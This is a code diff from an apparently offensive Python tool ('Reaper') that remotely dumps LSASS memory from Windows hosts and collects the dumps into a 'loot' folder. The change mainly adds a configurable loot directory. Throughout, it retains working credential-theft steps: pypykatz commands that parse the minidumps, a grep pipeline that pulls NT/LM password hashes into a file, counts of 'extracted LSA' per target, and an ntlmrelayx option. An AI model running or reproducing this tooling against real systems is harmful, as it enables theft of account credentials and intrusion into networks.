@@ -1951,18 +1951,18 @@ def setup_share():
 
 def auto_parse():
     printnlog('\n[parsing files]\n')
-    os.system('sudo python3 -m pypykatz lsa minidump -d {}/loot/{}/ -o {}/loot/{}/dumped_full.txt'.format(cwd, timestamp, cwd, timestamp))
-    os.system('sudo python3 -m pypykatz lsa -g minidump -d {}/loot/{}/ -o {}/loot/{}/dumped_full_grep.grep'.format(cwd, timestamp, cwd, timestamp))
-    os.system("echo 'Domain:Username:NT:LM' > {}/loot/{}/dumped_msv.txt; grep --text 'msv' {}/loot/{}/dumped_full_grep.grep | cut -d ':' -f 2,3,4,5 | grep -v 'IIS APPPOOL\|NT AUTHORITY\|Window Manage\|Font Driver Host\|\$\|::\|a00000000000' >> {}/loot/{}/dumped_msv.txt".format(cwd, timestamp, cwd, timestamp, cwd, timestamp))
+    os.system('sudo python3 -m pypykatz lsa minidump -d {}/loot/{}/ -o {}/loot/{}/dumped_full.txt'.format(options.loot_dir, timestamp, options.loot_dir, timestamp))
+    os.system('sudo python3 -m pypykatz lsa -g minidump -d {}/loot/{}/ -o {}/loot/{}/dumped_full_grep.grep'.format(options.loot_dir, timestamp, options.loot_dir, timestamp))
+    os.system("echo 'Domain:Username:NT:LM' > {}/loot/{}/dumped_msv.txt; grep --text 'msv' {}/loot/{}/dumped_full_grep.grep | cut -d ':' -f 2,3,4,5 | grep -v 'IIS APPPOOL\|NT AUTHORITY\|Window Manage\|Font Driver Host\|\$\|::\|a00000000000' >> {}/loot/{}/dumped_msv.txt".format(options.loot_dir, timestamp, options.loot_dir, timestamp, options.loot_dir, timestamp))
 
     remove_files = input('\nWould you like to delete the .dmp files now? (Y/n) ')
     if remove_files.lower() == 'y':
-        os.system('sudo rm {}/loot/{}/*.dmp'.format(cwd, timestamp))
+        os.system('sudo rm {}/loot/{}/*.dmp'.format(options.loot_dir, timestamp))
 
     if options.av:
         printnlog('\n{} Reading dumped_msv.txt'.format(green_plus))
         try:
-            with open('{}/loot/{}/dumped_msv.txt'.format(cwd, timestamp), 'r') as f:  # read the dumped_msv.txt file into msv_creds
+            with open('{}/loot/{}/dumped_msv.txt'.format(options.loot_dir, timestamp), 'r') as f:  # read the dumped_msv.txt file into msv_creds
                 msv_creds = f.readlines()
                 f.close()
         except BaseException as e:
@@ -2007,22 +2007,22 @@ def auto_parse():
 
 def alt_exec_exit():
     try:  # move the share file to the loot dir
-        os.system('sudo mv /var/tmp/{} {}/loot/{}'.format(share_name, cwd, timestamp))
+        os.system('sudo mv /var/tmp/{} {}/loot/{}'.format(share_name, options.loot_dir, timestamp))
     except BaseException as e:
         pass
 
-    dumped_hosts = glob.glob('{}/loot/{}/*.dmp'.format(cwd, timestamp))  # gets a list of all the .dmp file names within the output dir
+    dumped_hosts = glob.glob('{}/loot/{}/*.dmp'.format(options.loot_dir, timestamp))  # gets a list of all the .dmp file names within the output dir
     dumped_hosts_fin = []
     for item in dumped_hosts:
         dumped_hosts_fin.append(item[item.rfind('/') + 1:item.rfind('.')])  # this substring should make the filename hostname-ip only
-    with open('{}/loot/{}/dumped_hosts.txt'.format(cwd, timestamp), 'w') as f:  # writes the list to a file
+    with open('{}/loot/{}/dumped_hosts.txt'.format(options.loot_dir, timestamp), 'w') as f:  # writes the list to a file
         for host in dumped_hosts_fin:
             f.write(host + '\n')
         f.close()
 
     if options.ap:  # autoparse
         auto_parse()
-    printnlog('\n{}Loot dir: {}/loot/{}{}\n'.format(color_YELL, cwd, timestamp, color_reset))
+    printnlog('\n{}Loot dir: {}/loot/{}{}\n'.format(color_YELL, options.loot_dir, timestamp, color_reset))
 
     printnlog('{}[-]{} Cleaning up please wait'.format(color_BLU, color_reset))
 
@@ -2059,7 +2059,7 @@ def alt_exec_exit():
         pass
 
     try:
-        os.system('sudo mv {}/indivlog.txt {}/loot/{}/log.txt'.format(cwd, cwd, timestamp))
+        os.system('sudo mv {}/indivlog.txt {}/loot/{}/log.txt'.format(cwd, options.loot_dir, timestamp))
     except BaseException as e:
         pass
 
@@ -2302,13 +2302,13 @@ def auto_drive(addresses, domain):  # really helpful so you dont have to know wh
                             pass
 
                         try:
-                            os.system('sudo mv /var/tmp/{} {}/loot/{}'.format(share_name, cwd, timestamp))
-                            printnlog('\n{}Loot dir: {}/loot/{}{}'.format(color_YELL, cwd, timestamp, color_reset))
+                            os.system('sudo mv /var/tmp/{} {}/loot/{}'.format(share_name, options.loot_dir, timestamp))
+                            printnlog('\n{}Loot dir: {}/loot/{}{}'.format(color_YELL, options.loot_dir, timestamp, color_reset))
                         except BaseException as e:
                             pass
 
                         try:
-                            os.system('sudo mv {}/indivlog.txt {}/loot/{}/log.txt'.format(cwd, cwd, timestamp))
+                            os.system('sudo mv {}/indivlog.txt {}/loot/{}/log.txt'.format(cwd, options.loot_dir, timestamp))
                         except BaseException as e:
                             pass
 
@@ -2481,8 +2481,6 @@ if __name__ == '__main__':
     if os.path.isfile('{}/exit'.format(cwd)):
         os.system('sudo rm {}/exit'.format(cwd))
 
-    if os.path.isdir('{}/loot'.format(cwd)) == False:
-        os.makedirs('{}/loot'.format(cwd))
 
     if os.path.isfile('{}/indivlog.txt'.format(cwd)):
         os.system('sudo rm {}/indivlog.txt'.format(cwd))
@@ -2501,6 +2499,7 @@ if __name__ == '__main__':
     parser.add_argument('-share', action='store', default='C$', choices=['C$', 'ADMIN$'], help='share where the output will be grabbed from (default C$ for smbexec and wmiexec) (wmiexec and smbexec ONLY)')
     parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
     parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
+    parser.add_argument('-l', '--loot-dir', action='store', default=cwd, help='Directory to place the "loot" folder in Default=Reapers Dir')
     parser.add_argument('-sku', action='store_true', help='Skips the update check (good for if you do not have internet and dont want to wait for it to timeout)')
     parser.add_argument('-oe', action='store_true', default=False, help='"Other Exec" Pause just before the execution of the payload (Good for when you want to execute the payload using other methods eg crackmapexec\'s -x)')
     parser.add_argument('-relayx', action='store_true', help='Use ntlmrelayx relays for authentication')
@@ -2548,7 +2547,6 @@ if __name__ == '__main__':
         parser.print_help()
         sys.exit(1)
 
-
     options = parser.parse_args()
 
     apt_package_chk(options.payload)
@@ -2558,6 +2556,15 @@ if __name__ == '__main__':
 
     if options.relayx and options.oe == False:
         options.oe = True
+
+    if options.loot_dir.endswith('/'):
+        options.loot_dir = options.loot_dir[:-1]
+
+    if os.path.isdir('{}/loot'.format(options.loot_dir)) == False:
+        try:
+            os.makedirs('{}/loot'.format(options.loot_dir))
+        except Exception:
+            print('There is an error with your loot dir "{}"'.format(options.loot_dir))
 
     # Init the example's logger theme
     logger.init(options.ts)
@@ -2835,26 +2842,26 @@ if __name__ == '__main__':
                 count += 1
 
         time.sleep(2)
-        os.system('sudo mv /var/tmp/{} {}/loot/{}'.format(share_name, cwd, timestamp))
+        os.system('sudo mv /var/tmp/{} {}/loot/{}'.format(share_name, options.loot_dir, timestamp))
 
         # for when you're attacking a lot of targets to quickly see how many we got
-        printnlog('\n{} Total Extracted LSA: {}/{}'.format(green_plus, len(fnmatch.filter(os.listdir("{}/loot/{}".format(cwd, timestamp)), '*.dmp')), len(addresses)))
+        printnlog('\n{} Total Extracted LSA: {}/{}'.format(green_plus, len(fnmatch.filter(os.listdir("{}/loot/{}".format(options.loot_dir, timestamp)), '*.dmp')), len(addresses)))
 
         if os.path.isfile('{}/drives.txt'.format(cwd)):  # cleanup that file
             os.system('sudo rm {}/drives.txt'.format(cwd))
 
-        dumped_hosts = glob.glob('{}/loot/{}/*.dmp'.format(cwd, timestamp))  # gets a list of all the .dmp file names within the output dir
+        dumped_hosts = glob.glob('{}/loot/{}/*.dmp'.format(options.loot_dir, timestamp))  # gets a list of all the .dmp file names within the output dir
         dumped_hosts_fin = []
         for item in dumped_hosts:
             dumped_hosts_fin.append(item[item.rfind('/') + 1:item.rfind('.')])  # this substring should make the filename hostname-ip only
-        with open('{}/loot/{}/dumped_hosts.txt'.format(cwd, timestamp), 'w') as f:  # writes the list to a file
+        with open('{}/loot/{}/dumped_hosts.txt'.format(options.loot_dir, timestamp), 'w') as f:  # writes the list to a file
             for host in dumped_hosts_fin:
                 f.write(host + '\n')
             f.close()
 
         if options.ap:
             auto_parse()
-        printnlog('\n{}Loot dir: {}/loot/{}{}\n'.format(color_YELL, cwd, timestamp, color_reset))
+        printnlog('\n{}Loot dir: {}/loot/{}{}\n'.format(color_YELL, options.loot_dir, timestamp, color_reset))
 
     except KeyboardInterrupt as e:
         logging.error(str(e))
@@ -2893,13 +2900,13 @@ if __name__ == '__main__':
             pass
 
         try:
-            os.system('sudo mv /var/tmp/{} {}/loot/{}'.format(share_name, cwd, timestamp))
-            printnlog('\n{}Loot dir: {}/loot/{}{}'.format(color_YELL, cwd, timestamp, color_reset))
+            os.system('sudo mv /var/tmp/{} {}/loot/{}'.format(share_name, options.loot_dir, timestamp))
+            printnlog('\n{}Loot dir: {}/loot/{}{}'.format(color_YELL, options.loot_dir, timestamp, color_reset))
         except BaseException as e:
             pass
 
         try:
-            os.system('sudo mv {}/indivlog.txt {}/loot/{}/log.txt'.format(cwd, cwd, timestamp))
+            os.system('sudo mv {}/indivlog.txt {}/loot/{}/log.txt'.format(cwd, options.loot_dir, timestamp))
         except BaseException as e:
             pass
 
@@ -2940,7 +2947,7 @@ if __name__ == '__main__':
         pass
 
     try:
-        os.system('sudo mv {}/indivlog.txt {}/loot/{}/log.txt'.format(cwd, cwd, timestamp))
+        os.system('sudo mv {}/indivlog.txt {}/loot/{}/log.txt'.format(cwd, options.loot_dir, timestamp))
     except BaseException as e:
         pass
 
